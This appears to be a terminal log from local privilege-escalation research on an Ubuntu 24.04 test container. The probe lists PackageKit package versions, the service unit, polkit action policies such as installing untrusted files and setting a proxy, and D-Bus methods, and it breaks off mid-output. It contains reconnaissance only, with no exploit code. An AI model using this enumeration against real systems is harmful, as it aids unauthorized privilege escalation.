PackageKit transaction deep2 probe
target=ubuntu24-server-lpe-target
2026-05-16T16:18:45-0400

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== baseline target =="\ncat /etc/os-release | sed -n "1,8p"\nuname -a\nid attacker\nid selfauth\necho\necho "== PackageKit package/service proof =="\ndpkg-query -W -f="\\${Package}\\t\\${Version}\\t\\${Architecture}\\n" \\\n  packagekit packagekit-tools libpackagekit-glib2-18 gir1.2-packagekitglib-1.0 \\\n  python3-gi apt dbus polkitd systemd dpkg 2>&1 | sort || true\nsystemctl cat packagekit.service\nsystemctl status packagekit.service --no-pager -l | sed -n "1,18p" || true\necho\necho "== PackageKit policy/action proof =="\nawk "/org.freedesktop.packagekit.package-install-untrusted/{flag=1} flag{print} /<\\/action>/{if(flag) exit}" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy\nawk "/org.freedesktop.packagekit.system-sources-configure/{flag=1} flag{print} /<\\/action>/{if(flag) exit}" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy\nawk "/org.freedesktop.packagekit.system-sources-refresh/{flag=1} flag{print} /<\\/action>/{if(flag) exit}" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy\nawk "/org.freedesktop.packagekit.system-network-proxy-configure/{flag=1} flag{print} /<\\/action>/{if(flag) exit}" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy\necho\necho "== PackageKit interface anchors =="\ngrep -R -n "method name=\\"SetHints\\"\\|method name=\\"Cancel\\"\\|method name=\\"GetDetailsLocal\\"\\|method name=\\"GetFilesLocal\\"\\|method name=\\"InstallFiles\\"\\|method name=\\"RefreshCache\\"\\|method name=\\"RepoEnable\\"\\|method name=\\"RepoSetData\\"\\|method name=\\"SetProxy\\"" /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit*.xml\n'
== baseline target ==
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
Linux 508d797cbad0 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)

== PackageKit package/service proof ==
apt	2.8.3	arm64
dbus	1.14.10-4ubuntu4.1	arm64
dpkg	1.22.6ubuntu6.6	arm64
gir1.2-packagekitglib-1.0	1.2.8-2ubuntu1.5	arm64
libpackagekit-glib2-18	1.2.8-2ubuntu1.5	arm64
packagekit	1.2.8-2ubuntu1.5	arm64
packagekit-tools	1.2.8-2ubuntu1.5	arm64
polkitd	124-2ubuntu1.24.04.3	arm64
python3-gi	3.48.2-1	arm64
systemd	255.4-1ubuntu8.15	arm64
# /usr/lib/systemd/system/packagekit.service
[Unit]
Description=PackageKit Daemon
# PK doesn't know how to do anything on ostree-managed systems;
# currently the design is to have dedicated daemons like
# eos-updater and rpm-ostree, and gnome-software talks to those.
ConditionPathExists=!/run/ostree-booted
Wants=network-online.target

[Service]
Type=dbus
BusName=org.freedesktop.PackageKit
User=root
ExecStart=/usr/libexec/packagekitd
● packagekit.service - PackageKit Daemon
     Loaded: loaded (/usr/lib/systemd/system/packagekit.service; static)
     Active: active (running) since Sat 2026-05-16 20:17:36 UTC; 1min 9s ago
   Main PID: 189163 (packagekitd)
      Tasks: 4 (limit: 9517)
     Memory: 3.1M (peak: 4.3M)
        CPU: 20ms
     CGroup: /docker/508d797cbad09303136451b05788f2bf2f4994db28f983d783dfd7f7e10a399b/system.slice/packagekit.service
             └─189163 /usr/libexec/packagekitd

May 16 20:17:36 508d797cbad0 systemd[1]: Starting packagekit.service - PackageKit Daemon...
May 16 20:17:36 508d797cbad0 PackageKit[189163]: daemon start
May 16 20:17:36 508d797cbad0 systemd[1]: Started packagekit.service - PackageKit Daemon.

== PackageKit policy/action proof ==
  <action id="org.freedesktop.packagekit.package-install-untrusted">
    <!-- SECURITY:
          - Normal users require admin authentication to install untrusted or
            unrecognised packages, as allowing users to do this without a
            password would be a massive security hole.
          - This is not retained as each package should be authenticated.
     -->
    <description>Install untrusted local file</description>
    <description xml:lang="zh_TW">安裝未信任的本地檔案</description>
    <description xml:lang="zh_CN">安装未受信任的本地文件</description>
    <description xml:lang="uk">Встановлення ненадійного локального файла</description>
    <description xml:lang="tr">Güvenilmeyen yerel dosyayı kur</description>
    <description xml:lang="th">ติดตั้งไฟล์ที่ไม่น่าเชื่อถือบนเครื่อง</description>
    <description xml:lang="te">నమ్మదగని స్థానిక దస్త్రమును సంస్థాపించుము</description>
    <description xml:lang="ta">நம்பமுடியாத  உள்ளமை கோப்பினை நிறுவு</description>
    <description xml:lang="sv">Installera opålitlig lokal fil</description>
    <description xml:lang="sr">Инсталирај неповерљиву месну датотеку</description>
    <description xml:lang="sr@latin">Instaliraj nepoverljivu lokalnu datoteku</description>
    <description xml:lang="sq">Instalo kartelë vendore jo të besuar</description>
    <description xml:lang="sl">Namesti krajevno datoteko, ki ni zaupanja vredna</description>
    <description xml:lang="sk">Inštalovať nedôveryhodný lokálny súbor</description>
    <description xml:lang="si">විශ්වාස නොකළ දේශීය ගොනුව ස්ථාපනය කරන්න</description>
    <description xml:lang="ru">Установить локальный файл из ненадёжных источниов</description>
    <description xml:lang="ro">Instalează pachet local fără încredere</description>
    <description xml:lang="pt">Instalar ficheiro local não confiável</description>
    <description xml:lang="pt_BR">Instalar arquivo local não confiável</description>
    <description xml:lang="pl">Instalacja niezaufanego lokalnego pliku</description>
    <description xml:lang="pa">ਅਣ-ਟਰੱਸਟ ਲੋਕਲ ਫਾਇਲ ਇੰਸਟਾਲ</description>
    <description xml:lang="or">ବିଶ୍ୱସ୍ତ ସ୍ଥାନୀୟ ଫାଇଲକୁ ସ୍ଥାପନ କରନ୍ତୁ</description>
    <description xml:lang="oc">Installar un fichièr local pas signat</description>
    <description xml:lang="nl">Lokaal niet-vertrouwd bestand installeren</description>
    <description xml:lang="mr">अविश्वासर्ह स्थानीय फाइल प्रतिष्ठापीत करा</description>
    <description xml:lang="ml">അവിശ്വസനീയമായ ലോക്കല്‍ ഫയല്‍ ഇന്‍സ്റ്റോള്‍ ചെയ്യുക</description>
    <description xml:lang="lv">Instalēt neuzticamu vietējo datni</description>
    <description xml:lang="lt">Įdiegti nepatikimą vietinį failą</description>
    <description xml:lang="ko">신뢰할 수 없는 로컬 파일 설치</description>
    <description xml:lang="kn">ನಂಬದೆ ಇರುವ ಸ್ಥಳೀಯ ಕಡತವನ್ನು ಅನುಸ್ಥಾಪಿಸು</description>
    <description xml:lang="ka">არასანდო ლოკალური ფაილის დაყენება</description>
    <description xml:lang="ja">信頼できないローカルファイルをインストール</description>
    <description xml:lang="it">Installa file locale non affidabile</description>
    <description xml:lang="id">Pasang berkas lokal yang tak terpercaya</description>
    <description xml:lang="hu">Nem megbízható helyi fájl telepítése</description>
    <description xml:lang="hr">Instaliraj nepouzdani paket</description>
    <description xml:lang="hi">अविश्वसनीय स्थानीय फाइल संस्थापित करें</description>
    <description xml:lang="he">התקנת קובץ מקומי לא מהימן</description>
    <description xml:lang="gu">વિશ્ર્વાસ ન રખાતી સ્થાનિક ફાઇલને સ્થાપિત કરો</description>
    <description xml:lang="gl">Instalar un ficheiro local sen confianza</description>
    <description xml:lang="fr">Installer un fichier local non signé</description>
    <description xml:lang="fi">Asenna paikallinen tiedosto, johon ei luoteta</description>
    <description xml:lang="eu">Instalatu fidagarria ez den fitxategi lokala</description>
    <description xml:lang="es">Instalar archivo local no confiable</description>
    <description xml:lang="en_GB">Install untrusted local file</description>
    <description xml:lang="el">Εγκατάσταση μη έμπιστου τοπικού αρχείου</description>
    <description xml:lang="de">Nicht vertrauenswürdige lokale Datei installieren</description>
    <description xml:lang="da">Installer upålidelig lokal fil</description>
    <description xml:lang="cs">Nainstalovat místní nedůvěryhodný soubor</description>
    <description xml:lang="ca">Instal·la el fitxer local sense confiança</description>
    <description xml:lang="bn_IN">অবিশ্বস্ত স্থানীয় ফাইল ইনস্টল করুন</description>
    <description xml:lang="bg">Инсталиране на недоверен локален файл</description>
    <description xml:lang="as">2    </description>
    <message>Authentication is required to install untrusted software</message>
    <message xml:lang="zh_TW">必須先通過身份核對才能安裝未受信任的軟體</message>
    <message xml:lang="zh_CN">安装未受信任的软件需要认证</message>
    <message xml:lang="uk">Для встановлення програмного забезпечення з ненадійних джерел слід пройти розпізнавання</message>
    <message xml:lang="tr">Güvenilmeyen yazılım kurmak için kimlik doğrulaması gerekiyor</message>
    <message xml:lang="sv">Autentisering krävs för att installera opålitlig programvara</message>
    <message xml:lang="sr">Потребно је потврђивање идентитета за неповерљивог софтвера</message>
    <message xml:lang="sq">Që të instalohet software jo i besuar, lypset mirëfillëtim</message>
    <message xml:lang="sl">Za namestitev programja, ki ni zaupanja vredno, je obvezna overitev</message>
    <message xml:lang="sk">Inštalácia nedôveryhodného softvéru vyžaduje overenie totožnosti</message>
    <message xml:lang="si">විශ්වාස නොකළ මෘදුකාංග ස්ථාපනය කිරීමට සත්‍යාපනය අවශ්‍ය වේ</message>
    <message xml:lang="ru">Для установки приложений из ненадёжных источников требуется аутентификация</message>
    <message xml:lang="ro">Este necesară autentificarea pentru a instala programe fără încredere</message>
    <message xml:lang="pt">Autenticação é necessária para instalar um pacote não confiável</message>
    <message xml:lang="pt_BR">Autenticação é necessária para instalar softwares não confiáveis</message>
    <message xml:lang="pl">Wymagane jest uwierzytelnienie, aby zainstalować niezaufane oprogramowanie</message>
    <message xml:lang="pa">ਨਾ-ਭਰੋਸੇਯੋਗ ਸਾਫਟਵੇਅਰ ਇੰਸਟਾਲ ਕਰਨ ਲਈ ਪਰਮਾਣਕਿਤਾ ਚਾਹੀਦੀ ਹੈ</message>
    <message xml:lang="nl">Authenticatie is verplicht bij installeren van untrusted software</message>
    <message xml:lang="ko">신뢰할 수 없는 프로그램을 설치하려면 인증해야 합니다</message>
    <message xml:lang="ja">信頼されていないソフトウェアをインストールするには認証が必要です</message>
    <message xml:lang="it">È richiesto autenticarsi per installare software non fidato</message>
    <message xml:lang="id">Otentikasi diperlukan untuk memasang perangkat lunak yang tak dipercaya</message>
    <message xml:lang="hu">Hitelesítés szükséges a nem megbízható szoftver telepítéséhez</message>
    <message xml:lang="hr">Potrebna je ovjera za instalaciju nepouzdanog softvera</message>
    <message xml:lang="he">נדרש אימות כדי להתקין תכנה בלתי מהימנה</message>
    <message xml:lang="gl">Requírese autenticación para instalar sotware non confiábel</message>
    <message xml:lang="fr">Une authentification est nécessaire pour installer un logiciel non certifié</message>
    <message xml:lang="fi">Tunnistautuminen vaaditaan ei-luotettavan ohjelmiston asentamiseksi</message>
    <message xml:lang="eu">Autentifikazioa behar da fidagarria ez den softwarea instalatzeko</message>
    <message xml:lang="es">Necesita autenticarse para instalar software no confiable</message>
    <message xml:lang="eo">Necesas aŭtentigo por instali programaron</message>
    <message xml:lang="en_GB">Authentication is required to install untrusted software</message>
    <message xml:lang="el">Απαιτείται πιστοποίηση για την εγκατάσταση αναξιόπιστου λογισμικού</message>
    <message xml:lang="de">Legitimation ist zum Installieren von nicht vertrauenswürdiger Software erforderlich</message>
    <message xml:lang="da">Godkendelse kræves for at installere upålidelige programmer</message>
    <message xml:lang="cs">Pro instalaci nedůvěryhodného softwaru je vyžadováno ověření</message>
    <message xml:lang="ca">Es requereix autenticació per instal·lar programari sense confiança</message>
    <message xml:lang="ar">الاستيثاق مطلوب لتثبيت برنامَج غير موثوق</message>
    <icon_name>package-x-generic</icon_name>
    <defaults>
      <allow_any>auth_admin</allow_any>
      <allow_inactive>auth_admin</allow_inactive>
      <allow_active>auth_admin</allow_active>
    </defaults>
    <annotate key="org.freedesktop.policykit.imply">org.freedesktop.packagekit.package-install</annotate>
  </action>
  <action id="org.freedesktop.packagekit.system-sources-configure">
    <!-- SECURITY:
          - Normal users require admin authentication to enable or disable
            software repositories as this can be used to enable new updates or
            install different versions of software.
     -->
    <description>Change software repository parameters</description>
    <description xml:lang="zh_TW">變更軟體庫參數</description>
    <description xml:lang="zh_CN">更改软件仓库参数</description>
    <description xml:lang="uk">Зміна параметрів сховища програмного забезпечення</description>
    <description xml:lang="tr">Yazılım depo parametrelerini değiştir</description>
    <description xml:lang="sv">Ändrar parametrar för programförråden</description>
    <description xml:lang="sr">Измени параметре ризнице софтвера</description>
    <description xml:lang="sq">Ndryshoni parametra depoje software-i</description>
    <description xml:lang="sl">Spremeni parametre skladišč programja</description>
    <description xml:lang="sk">Zmeniť parametre softvérového repozitára</description>
    <description xml:lang="si">මෘදුකාංග ගබඩා පරාමිතීන් වෙනස් කරන්න</description>
    <description xml:lang="ru">Изменить параметры репозитория приложений</description>
    <description xml:lang="ro">Schimbă parametrii depozitului de programe</description>
    <description xml:lang="pt">Alterar parâmetros da fonte de aplicação</description>
    <description xml:lang="pt_BR">Alterar parâmetros de repositório de software</description>
    <description xml:lang="pl">Zmiana parametrów repozytorium oprogramowania</description>
    <description xml:lang="pa">ਸਾਫਟਵੇਅਰ ਰਿਪੋਜ਼ਟਰੀ ਪੈਰਾਮੀਟਰਾਂ ਨੂੰ ਬਦਲੋ</description>
    <description xml:lang="ko">소프트웨어 저장소 인자 변경</description>
    <description xml:lang="ja">ソフトウェアリポジトリパラメータの変更</description>
    <description xml:lang="it">Modifica i parametri dei repository software</description>
    <description xml:lang="id">Ubah parameter repositori perangkat lunak</description>
    <description xml:lang="hu">Szoftvertároló-paraméterek módosítása</description>
    <description xml:lang="hr">Promijeni parametre repozitorija softvera</description>
    <description xml:lang="he">החלפת משתני מאגר תכנה</description>
    <description xml:lang="fr">Changer les paramètres du dépôt des logiciels</description>
    <description xml:lang="fi">Muuta ohjelmistolähteen parametrit</description>
    <description xml:lang="eu">Aldatu software-biltegien parametroak</description>
    <description xml:lang="es">Cambiar parámetros de repositorio de software</description>
    <description xml:lang="en_GB">Change software repository parameters</description>
    <description xml:lang="de">Parameter des Software-Repositoriums ändern</description>
    <description xml:lang="da">Skift parametre for programpakkearkiv</description>
    <description xml:lang="cs">Změnit parametry repozitáře softwaru</description>
    <description xml:lang="ca">Canvia els paràmetres del dipòsit de sistema</description>
    <message>Authentication is required to change software repository parameters</message>
    <message xml:lang="zh_TW">必須先通過身份核對才能變更軟體庫參數</message>
    <message xml:lang="zh_CN">更改软件仓库参数需要认证</message>
    <message xml:lang="uk">Для зміни параметрів сховища програмного забезпечення слід пройти розпізнавання</message>
    <message xml:lang="tr">Yazılım depo parametrelerini değiştirmek için kimlik doğrulaması gerekiyor</message>
    <message xml:lang="sv">Autentisering krävs för att ändra parametrar för programförråden</message>
    <message xml:lang="sr">Потребно је потврђивање идентитета за измену параметара ризница софтвера</message>
    <message xml:lang="sq">Që të ndryshohen parametra deposh software-i, lypset mirëfilltësim</message>
    <message xml:lang="sl">Za spremembo parametrov skladišč programja je zahtevana overitev</message>
    <message xml:lang="sk">Vyžaduje sa overenie totožnosti na zmenu parametrov softvérového repozitára</message>
    <message xml:lang="si">මෘදුකාංග ගබඩා පරාමිතීන් වෙනස් කිරීමට සත්‍යාපනය අවශ්‍ය වේ</message>
    <message xml:lang="ru">Для изменения параметров репозитория приложений необходима аутентификация</message>
    <message xml:lang="ro">Este necesară autentificarea pentru a schimba parametrii depozitului de programe</message>
    <message xml:lang="pt">Autenticação é necessária para alterar parâmetros da fonte de aplicação</message>
    <message xml:lang="pt_BR">Autenticação é necessária para alterar os parâmetros de repositório de software</message>
    <message xml:lang="pl">Wymagane jest uwierzytelnienie, aby zmienić parametry repozytorium oprogramowania</message>
    <message xml:lang="pa">ਸਾਫਟਵੇਅਰ ਰਿਪੋਜ਼ਟਰੀ ਪੈਰਾਮੀਟਰ ਬਦਲਣ ਲਈ ਪਰਮਾਣਕਿਤਾ ਚਾਹੀਦੀ ਹੈ</message>
    <message xml:lang="ko">소프트웨어 저장소 인자를 변경하려면 인증해야 합니다</message>
    <message xml:lang="ja">ソフトウェアリポジトリパラメータの変更には認証が必要です</message>
    <message xml:lang="it">È richiesto autenticarsi per modificare i parametri dei repository software</message>
    <message xml:lang="id">Otentikasi diperlukan untuk mengubah parameter repositori perangkat lunak</message>
    <message xml:lang="hu">Hitelesítés szükséges a szoftvertároló-paraméterek módosításához</message>
    <message xml:lang="hr">Potrebna je ovjera za promjenu parametara repozitorija softvera</message>
    <message xml:lang="he">נדרש אימות כדי לשנות את משתני מאגר התכנה</message>
    <message xml:lang="fr">Une authentification est nécessaire pour changer les paramètres du dépôt des logiciels</message>
    <message xml:lang="fi">Todennus vaaditaan muuttaaksesi ohjelmiston parametreja</message>
    <message xml:lang="eu">Autentifikazioa behar da software-biltegien parametroak aldatzeko</message>
    <message xml:lang="es">Necesita autenticarse para cambiar los parámetros del repositorio de software</message>
    <message xml:lang="en_GB">Authentication is required to change software repository parameters</message>
    <message xml:lang="de">Legitimation ist zur Änderung der Parameter zu den Software-Repositorien erforderlich</message>
    <message xml:lang="da">Godkendelse kræves for at skifte parametre for programpakkearkiv</message>
    <message xml:lang="cs">Pro změnu parametrů repozitáře softwaru je vyžádováno ověření</message>
    <message xml:lang="ca">Es requereix autenticació per canviar els paràmetres del dipòsit de programari</message>
    <message xml:lang="ar">الاستيثاق مطلوب لتغير مُعامِلات مستودع البرامج</message>
    <icon_name>package-x-generic</icon_name>
    <defaults>
      <allow_any>auth_admin</allow_any>
      <allow_inactive>auth_admin</allow_inactive>
      <allow_active>auth_admin_keep</allow_active>
    </defaults>
  </action>
  <action id="org.freedesktop.packagekit.system-sources-refresh">
    <!-- SECURITY:
          - Normal users do not require admin authentication to refresh the
            cache, as this doesn't actually install or remove software.
     -->
    <description>Refresh system repositories</description>
    <description xml:lang="zh_TW">重整系統軟體庫</description>
    <description xml:lang="zh_CN">刷新系统仓库</description>
    <description xml:lang="uk">Оновлення списків сховищ системи</description>
    <description xml:lang="tr">Sistem depolarını yenile</description>
    <description xml:lang="sv">Uppdatera systemprogramförråden</description>
    <description xml:lang="sr">Освежи системске ризнице</description>
    <description xml:lang="sq">Rifresko depo sistemi</description>
    <description xml:lang="sl">Osveži sistemska skladišča</description>
    <description xml:lang="sk">Obnoviť systémové repozitáre</description>
    <description xml:lang="si">පද්ධති ගබඩාවන් නැවුම් කරන්න</description>
    <description xml:lang="ru">Обновить системные репозитории</description>
    <description xml:lang="ro">Împrospătează depozitele sistemului</description>
    <description xml:lang="pt">Atualizar fontes do sistema</description>
    <description xml:lang="pt_BR">Atualizar repositórios de sistema</description>
    <description xml:lang="pl">Odświeżenie repozytoriów systemu</description>
    <description xml:lang="pa">ਸਿਸਟਮ ਰਿਪੋਜ਼ਟਰੀਆਂ ਤਾਜ਼ਾ ਕਰੋ</description>
    <description xml:lang="ko">시스템 저장소 새로 고침</description>
    <description xml:lang="ka">სისტემური რეპოზიტორიების განახლება</description>
    <description xml:lang="ja">システムリポジトリの更新</description>
    <description xml:lang="it">Aggiorna repository di sistema</description>
    <description xml:lang="id">Segarkan repositori sistem</description>
    <description xml:lang="hu">Rendszertárolók frissítése</description>
    <description xml:lang="hr">Osvježi repozitorije sustava</description>
    <description xml:lang="he">רענון מאגרי המערכת</description>
    <description xml:lang="fr">Actualiser les dépôts du système</description>
    <description xml:lang="fi">Päivitä järjestelmän ohjelmistolähteet</description>
    <description xml:lang="eu">Freskatu sistemaren biltegiak</description>
    <description xml:lang="es">Recargar repositorios del sistema</description>
    <description xml:lang="eo">Aktualigi sistem-deponejojn</description>
    <description xml:lang="en_GB">Refresh system repositories</description>
    <description xml:lang="de">System-Repositorien aktualisieren</description>
    <description xml:lang="da">Opdater systempakkearkiver</description>
    <description xml:lang="cs">Aktualizovat systémové repozitáře</description>
    <description xml:lang="ca">Refresca els dipòsits del sistema</description>
    <message>Authentication is required to refresh the system repositories</message>
    <message xml:lang="zh_TW">必須先通過身份核對才能重新整理系統軟體庫</message>
    <message xml:lang="zh_CN">刷新系统仓库需要认证</message>
    <message xml:lang="uk">Для оновлення списку сховищ системи слід пройти розпізнавання</message>
    <message xml:lang="tr">Sistem depolarını yenilemek için kimlik doğrulaması gerekiyor</message>
    <message xml:lang="sv">Autentisering krävs för att uppdatera systemprogramförråden</message>
    <message xml:lang="sr">Потребно је потврђивање идентитета за освежавање системских ризница</message>
    <message xml:lang="sq">Që të rifreskohen depot e sistemit, lypset mirëfilltësim</message>
    <message xml:lang="sl">Za osvežitev sistemskih skladišč je zahtevana overitev</message>
    <message xml:lang="sk">Vyžaduje sa overenie totožnosti na obnovenie systémových repozitárov</message>
    <message xml:lang="si">පද්ධති ගබඩාවන් නැවුම් කිරීමට සත්‍යාපනය අවශ්‍ය වේ</message>
    <message xml:lang="ru">Для обновления системных репозиториев необходима аутентификация</message>
    <message xml:lang="ro">Este necesară autentificarea pentru a împrospăta depozitele sistemului</message>
    <message xml:lang="pt">Autenticação é necessária para atualizar as fontes do sistema</message>
    <message xml:lang="pt_BR">Autenticação é necessária para atualizar os repositórios de sistema</message>
    <message xml:lang="pl">Wymagane jest uwierzytelnienie, aby odświeżyć repozytoria systemu</message>
    <message xml:lang="pa">ਸਿਸਟਮ ਰਿਪੋਜ਼ਟਰੀਆਂ ਤਾਜ਼ਾ ਕਰਨ ਲਈ ਪਰਮਾਣਕਿਤਾ ਚਾਹੀਦੀ ਹੈ</message>
    <message xml:lang="ko">시스템 저장소를 새로 고치려면 인증해야 합니다</message>
    <message xml:lang="ja">システムリポジトリの更新には認証が必要です</message>
    <message xml:lang="it">È richiesto autenticarsi per aggiornare i repository di sistema</message>
    <message xml:lang="id">Otentikasi diperlukan untuk menyegarkan repositori sistem</message>
    <message xml:lang="hu">Hitelesítés szükséges a rendszertárolók frissítéséhez</message>
    <message xml:lang="hr">Potrebna je ovjera za osvježavanje repozitorija sustava</message>
    <message xml:lang="he">נדרש אימות כדי לרענן את מאגרי המערכת</message>
    <message xml:lang="fr">Une authentification est nécessaire pour rafraîchir les dépôts du système </message>
    <message xml:lang="fi">Ohjelmistolähteiden päivittäminen vaatii tunnistautumisen</message>
    <message xml:lang="eu">Autentifikazioa behar da sistemaren biltegiak freskatzeko</message>
    <message xml:lang="es">Necesita autenticarse para actualizar los repositorios del sistema</message>
    <message xml:lang="eo">Necesas aŭtentigo por aktualigi la sistem-deponejojn</message>
    <message xml:lang="en_GB">Authentication is required to refresh the system repositories</message>
    <message xml:lang="de">Legitimation ist zum Aktualisieren der System-Repositorien erforderlich</message>
    <message xml:lang="da">Godkendelse kræves for at opdatere systempakkearkiverne</message>
    <message xml:lang="cs">Pro aktualizaci systémových repozitářů je vyžadováno ověření</message>
    <message xml:lang="ca">Es requereix autenticació per refrescar els dipòsits de sistema</message>
    <message xml:lang="ar">الاستيثاق مطلوب لتحديث مستودعات النظام</message>
    <icon_name>package-x-generic</icon_name>
    <defaults>
      <allow_any>auth_admin</allow_any>
      <allow_inactive>yes</allow_inactive>
      <allow_active>yes</allow_active>
    </defaults>
  </action>
  <action id="org.freedesktop.packagekit.system-network-proxy-configure">
    <!-- SECURITY:
          - Normal users do not require admin authentication to set the proxy
            used for downloading packages.
     -->
    <description>Set network proxy</description>
    <description xml:lang="zh_TW">設定網路代理伺服器</description>
    <description xml:lang="zh_CN">设置网络代理</description>
    <description xml:lang="uk">Встановлення проксі-сервер</description>
    <description xml:lang="tr">Vekil sunucuyu ayarla</description>
    <description xml:lang="te">నెట్వర్కు ప్రోక్సీను అమర్చుము</description>
    <description xml:lang="ta">பிராக்ஸி பிணையத்தைஅமை</description>
    <description xml:lang="sv">Ange nätverksproxyserver</description>
    <description xml:lang="sr">Постави мрежног посредника</description>
    <description xml:lang="sr@latin">Postavi mrežnog posrednika</description>
    <description xml:lang="sq">Ujdisni ndërmjetës rrjeti</description>
    <description xml:lang="sl">Nastavi posredniški strežnik omrežja</description>
    <description xml:lang="sk">Nastaviť proxy server</description>
    <description xml:lang="si">ජාල ප්‍රොක්සි සකසන්න</description>
    <description xml:lang="ru">Указать прокси-сервер</description>
    <description xml:lang="ro">Definește proxy de rețea</description>
    <description xml:lang="pt">Configurar o proxy da rede</description>
    <description xml:lang="pt_BR">Definir um proxy de rede</description>
    <description xml:lang="pl">Ustawienie pośrednika sieciowego</description>
    <description xml:lang="pa">ਨੈੱਟਵਰਕ ਪਰਾਕਸੀ ਸੈੱਟ ਕਰੋ</description>
    <description xml:lang="or">ନେଟୱର୍କ ପ୍ରକ୍ସି ସେଟ କରନ୍ତୁ</description>
    <description xml:lang="oc">Configurar lo proxy de ret</description>
    <description xml:lang="nl">Stel netwerkproxy in</description>
    <description xml:lang="mr">जाळं प्रॉक्सी निश्चित करा</description>
    <description xml:lang="ml">നെറ്റ്‌വര്‍ക്ക് പ്രോക്സി സജ്ജമാക്കുക</description>
    <description xml:lang="lv">Iestatīt tīkla starpniekserveri</description>
    <description xml:lang="lt">Nustatyti įgaliotąjį tinklo serverį</description>
    <description xml:lang="ko">네트워크 프록시 설정</description>
    <description xml:lang="kn">ಜಾಲಬಂಧ ಪ್ರಾಕ್ಸಿಯನ್ನು ಸಿದ್ಧಗೊಳಿಸು</description>
    <description xml:lang="ka">ქსელური პროქსის დაყენება</description>
    <description xml:lang="ja">ネットワークプロキシをセット</description>
    <description xml:lang="it">Imposta proxy di rete</description>
    <description xml:lang="id">Tata proksi jaringan</description>
    <description xml:lang="hu">Hálózati proxy beállítása</description>
    <description xml:lang="hr">Postavi mrežni proxy</description>
    <description xml:lang="hi">संजाल प्रॉक्सी सेट करें</description>
    <description xml:lang="he">הגדרת מתווך לרשת</description>
    <description xml:lang="gu">નેટવર્ક પ્રોક્સીને સુયોજિત કરો</description>
    <description xml:lang="gl">Estabelecer o proxy da rede</description>
    <description xml:lang="fr">Configurer le proxy réseau</description>
    <description xml:lang="fi">Aseta välipalvelin</description>
    <description xml:lang="eu">Ezarri sarearen proxy-a</description>
    <description xml:lang="es">Establecer el proxy de la red</description>
    <description xml:lang="en_GB">Set network proxy</description>
    <description xml:lang="el">Ορισμός διαμεσολαβητή δικτύου</description>
    <description xml:lang="de">Netwerk-Proxy festlegen</description>
    <description xml:lang="da">Sæt netværksproxy</description>
    <description xml:lang="cs">Nastavit síťovou proxy</description>
    <description xml:lang="ca">Estableix el servidor intermediari</description>
    <description xml:lang="bn_IN">নেটওয়ার্ক প্রক্সি নির্ধারণ করুন</description>
    <description xml:lang="bg">Задаване на сървър-посредник</description>
    <description xml:lang="as">নে'টৱৰ্ক নিযুক্তক নিৰ্ধাৰিত কৰক</description>
    <message>Authentication is required to set the network proxy used for downloading software</message>
    <message xml:lang="zh_TW">必須先通過身份核對才能設定用來下載軟體的網路代理</message>
    <message xml:lang="zh_CN">设置下载软件所用的代理服务器需要认证</message>
    <message xml:lang="uk">Для визначення проксі-сервера, який буде використано для отримання програмного забезпечення, слід пройти розпізнавання</message>
    <message xml:lang="tr">Yazılım indirmek üzere vekil sunucuyu ayarlamak için kimlik doğrulaması gerekiyor</message>
    <message xml:lang="sv">Autentisering krävs för att ställa in nätverksproxyn som används för att hämta ner programvara</message>
    <message xml:lang="sr">Потребно је потврђивање идентитета за подешавање мрежног посредника коришћеног за преузимање софтвера</message>
    <message xml:lang="sq">Që të ujdiset ndërmjetës i përdorur për shkarkim software-i, lypset mirëfilltësim</message>
    <message xml:lang="sl">Za nastavitev omrežnega posredniškega strežnika, uporabljenega za prejem programja, je obvezna overitev</message>
    <message xml:lang="sk">Nastavenie sieťového proxy servera na aktualizáciu softvéru vyžaduje overenie totožnosti</message>
    <message xml:lang="si">මෘදුකාංග බාගත කිරීම සඳහා භාවිතා කරන ජාල ප්‍රොක්සි සැකසීමට සත්‍යාපනය අවශ්‍ය වේ</message>
    <message xml:lang="ru">Для настройки прокси-сервера, используемого для загрузки приложений, необходима аутентификация</message>
    <message xml:lang="ro">Este necesară autentificarea pentru a stabili proxy-ul de rețea folosit la descărcarea programelor</message>
    <message xml:lang="pt">Autenticação é necessária para configurar o proxy de rede utilizado para transferir pacotes</message>
    <message xml:lang="pt_BR">Autenticação é necessária para definir um proxy de rede para baixar softwares</message>
    <message xml:lang="pl">Wymagane jest uwierzytelnienie, aby ustawić pośrednika sieciowego używanego do pobierania oprogramowania</message>
    <message xml:lang="pa">ਸਾਫਟਵੇਅਰ ਡਾਊਨਲੋਡ ਕਰਨ ਲਈ ਨੈੱਟਵਰਕ ਪਰਾਕਸੀ ਸੈੱਟ ਕਰਨ ਲਈ ਪਰਮਾਣਕਿਤਾ ਚਾਹੀਦੀ ਹੈ</message>
    <message xml:lang="nl">Authenticatie is vereist bij instellen van een netwerkproxy die gebruikt wordt voor het downloaden van software</message>
    <message xml:lang="ko">소프트웨어를 다운로드할 때 사용할 네트워크 프록시를 설정하려면 인증해야 합니다</message>
    <message xml:lang="ja">ソフトウェアのダウンロードに使用するネットワークプロキシを設定するには、認証が必要です</message>
    <message xml:lang="it">È richiesto autenticarsi per impostare il proxy di rete usato per scaricare software</message>
    <message xml:lang="id">Otentikasi diperlukan untuk menata proksi jaringan yang dipakai untuk mengunduh perangkat lunak</message>
    <message xml:lang="hu">Hitelesítés szükséges a szoftver letöltéséhez használt hálózati proxy beállításához</message>
    <message xml:lang="hr">Potrebna je ovjera za postavljanje mrežnog proxya preuzimanja softvera</message>
    <message xml:lang="he">נדרש אימות כדי להגדיר את מתווך הרשת לטובת הורדת תכנה</message>
    <message xml:lang="gl">Requírese autenticación para estabelecer un proxy de rede para usar para desactualizar software</message>
    <message xml:lang="fr">Une authentification est nécessaire pour configurer le serveur mandataire utilisé pour le téléchargement de logiciels</message>
